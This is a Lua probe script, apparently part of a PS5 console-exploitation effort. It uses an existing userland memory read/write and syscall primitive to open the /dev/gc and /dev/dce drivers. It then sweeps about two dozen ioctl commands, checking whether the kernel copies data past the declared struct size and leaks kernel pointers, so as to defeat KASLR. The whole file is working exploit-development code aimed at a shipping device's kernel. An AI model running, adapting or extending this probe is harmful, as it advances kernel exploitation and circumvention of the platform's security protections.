-- CRASH_CLASS: LOW
-- PROBE 56m: ioctl over-copy scan — Praetorian-style kernel pointer leak
--
-- Context: Praetorian's PS5 KASLR defeat used an ioctl handler that copies
-- more data back to userland than the declared struct size, leaking stack
-- canary + kernel return address. Our ioctl sweep (273a-287a) tested what
-- the driver writes, but not whether copyout extends past the declared
-- length. This probe pre-fills large buffers with a sentinel and checks
-- how many bytes change past the declared size.
--
-- Method: for each /dev/gc group 0x81 command, allocate 0x1000 bytes,
-- fill with 0xAA, call ioctl, scan for modified bytes past declared length
-- and for kernel pointer patterns (0xFFFF8xxx) anywhere in the buffer.

print("=== PROBE 56m: IOCTL OVER-COPY SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- open /dev/gc
local sc5 = mk(5)    -- open
local sc54 = mk(54)  -- ioctl
local sc6 = mk(6)    -- close

local devname = memory.alloc(16)
-- "/dev/gc\0" = 2F 64 65 76 2F 67 63 00
wd(N(devname), 0x7665642F)      -- /dev
wd(N(devname) + 4, 0x0063672F)  -- /gc\0

local ok, fd_val = pcall(function()
    return sc5(devname, uint64(0), uint64(0))  -- O_RDONLY
end)
local fd = ok and N(fd_val) or -1
print("gc_fd=" .. fd)
if fd < 0 then print("ABORT: cannot open /dev/gc"); return end

-- Commands to test: code, declared_length
-- Skip 0xC0048125 (blocks forever) and 0x80888123 (input-only, tested separately)
local cmds = {
    {code = 0x40048135, len = 4,     name = "8135"},
    {code = 0x4004813A, len = 4,     name = "813A"},
    {code = 0x40088137, len = 8,     name = "8137"},
    {code = 0x8004813C, len = 4,     name = "813C"},
    {code = 0xC0048113, len = 4,     name = "8113"},
    {code = 0xC0048114, len = 4,     name = "8114"},
    {code = 0xC0048115, len = 4,     name = "8115"},
    {code = 0xC0048116, len = 4,     name = "8116"},
    {code = 0xC0048117, len = 4,     name = "8117"},
    {code = 0xC004811D, len = 4,     name = "811D"},
    {code = 0xC004811F, len = 4,     name = "811F"},
    {code = 0xC004812E, len = 4,     name = "812E"},
    {code = 0xC0088101, len = 8,     name = "8101"},
    {code = 0xC0088111, len = 8,     name = "8111"},
    {code = 0xC008811B, len = 8,     name = "811B"},
    {code = 0xC0088133, len = 8,     name = "8133"},
    {code = 0xC010810B, len = 0x10,  name = "810B"},
    {code = 0xC0108120, len = 0x10,  name = "8120"},
    {code = 0xC0108139, len = 0x10,  name = "8139"},
    {code = 0xC0188132, len = 0x18,  name = "8132"},
    {code = 0xC0288130, len = 0x28,  name = "8130"},
    {code = 0xC030811E, len = 0x30,  name = "811E"},
    {code = 0xC0488131, len = 0x48,  name = "8131"},
}

local BUF_SZ = 0x1000  -- 4KB scan area per command
local SENTINEL = 0xAAAAAAAA

local kptr_found = false

for _, cmd in ipairs(cmds) do
    if not alive() then print("DEAD mid-scan"); break end

    -- Allocate and fill with sentinel
    local buf = memory.alloc(BUF_SZ)
    local ba = N(buf)
    for off = 0, BUF_SZ - 4, 4 do
        wd(ba + off, SENTINEL)
    end

    -- Call ioctl
    local ok2, ret = pcall(function()
        return sc54(uint64(fd), uint64(cmd.code), uint64(ba))
    end)
    local rv = ok2 and N(ret) or -999

    -- Scan for modified bytes past declared length
    local over_start = nil
    local over_end = 0
    local kptr_offsets = {}

    for off = 0, BUF_SZ - 4, 4 do
        local val = rd(ba + off)
        if val ~= SENTINEL then
            if off >= cmd.len and not over_start then
                over_start = off
            end
            if off >= cmd.len then
                over_end = off
            end
            -- Check for kernel pointer pattern
            if off + 4 <= BUF_SZ then
                local hi = rd(ba + off + 4)
                if hi and hi ~= SENTINEL then
                    local uh = hi
                    if uh < 0 then uh = uh + 0x100000000 end
                    if uh >= 0xFFFF8000 and uh <= 0xFFFFFFFF then
                        kptr_offsets[#kptr_offsets + 1] = off
                    end
                end
            end
        end
    end

    -- Report
    local line = string.format("  %s ret=%d", cmd.name, rv)
    if over_start then
        line = line .. string.format(" OVERCOPY[0x%X-0x%X]", over_start, over_end)
        -- Dump the over-copied region
        print(line)
        local dump_end = over_end + 4
        if dump_end > BUF_SZ then dump_end = BUF_SZ end
        for off = over_start, dump_end - 4, 4 do
            local val = rd(ba + off)
            if val and val ~= SENTINEL then
                local uv = val
                if uv < 0 then uv = uv + 0x100000000 end
                print(string.format("    +0x%03X: 0x%08X", off, uv))
            end
        end
    else
        print(line)
    end

    if #kptr_offsets > 0 then
        kptr_found = true
        for _, koff in ipairs(kptr_offsets) do
            local lo = rd(ba + koff) or 0
            local hi = rd(ba + koff + 4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            print(string.format("    *** KPTR at +0x%03X: 0x%08X%08X ***", koff, hi, lo))
        end
    end
end

if not alive() then print("DEAD"); return end

-- ============ SECTION B: Test 0x80888123 (2184-byte input command) ============
print("")
print("--- B: large input cmd 0x80888123 ---")

local big = memory.alloc(0x1000)
local biga = N(big)
for off = 0, 0x888 + 0x100, 4 do
    wd(biga + off, SENTINEL)
end

local ok3, r3 = pcall(function()
    return sc54(uint64(fd), uint64(0x80888123), uint64(biga))
end)
print("  ret=" .. (ok3 and tostring(N(r3)) or "FAIL"))

-- Check if anything was written past 0x888
local b_over = false
for off = 0x888, 0x988, 4 do
    local val = rd(biga + off)
    if val ~= SENTINEL then
        if not b_over then
            b_over = true
            print("  OVERCOPY past 0x888:")
        end
        local uv = val
        if uv < 0 then uv = uv + 0x100000000 end
        print(string.format("    +0x%03X: 0x%08X", off, uv))
    end
end
if not b_over then print("  no overcopy") end

-- ============ SECTION C: Also scan other open devices ============
print("")
print("--- C: quick scan on /dev/dce ---")

local dce_name = memory.alloc(16)
wd(N(dce_name), 0x7665642F)      -- /dev
wd(N(dce_name) + 4, 0x6563642F)  -- /dce
wd(N(dce_name) + 8, 0)

local ok4, dce_fd = pcall(function()
    return sc5(dce_name, uint64(2), uint64(0))  -- O_RDWR
end)
local dfd = ok4 and N(dce_fd) or -1
print("  dce_fd=" .. dfd)

if dfd >= 0 then
    -- Test the known 0x80088209 command with overcopy check
    local dbuf = memory.alloc(0x200)
    local dba = N(dbuf)
    for off = 0, 0x1FC, 4 do wd(dba + off, SENTINEL) end

    local ok5, r5 = pcall(function()
        return sc54(uint64(dfd), uint64(0x80088209), uint64(dba))
    end)
    print("  0x80088209 ret=" .. (ok5 and tostring(N(r5)) or "FAIL"))

    local d_over = false
    for off = 8, 0x100, 4 do
        local val = rd(dba + off)
        if val ~= SENTINEL then
            if not d_over then
                d_over = true
                print("  bytes past declared 8:")
            end
            local uv = val
            if uv < 0 then uv = uv + 0x100000000 end
            print(string.format("    +0x%03X: 0x%08X", off, uv))
        end
    end
    if not d_over then print("  no overcopy past 8B") end

    pcall(function() sc6(uint64(dfd)) end)
end

pcall(function() sc6(uint64(fd)) end)

print("")
if kptr_found then
    print("*** KERNEL POINTERS FOUND — see above ***")
else
    print("no kernel pointers in any ioctl output")
end
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56m COMPLETE ===")
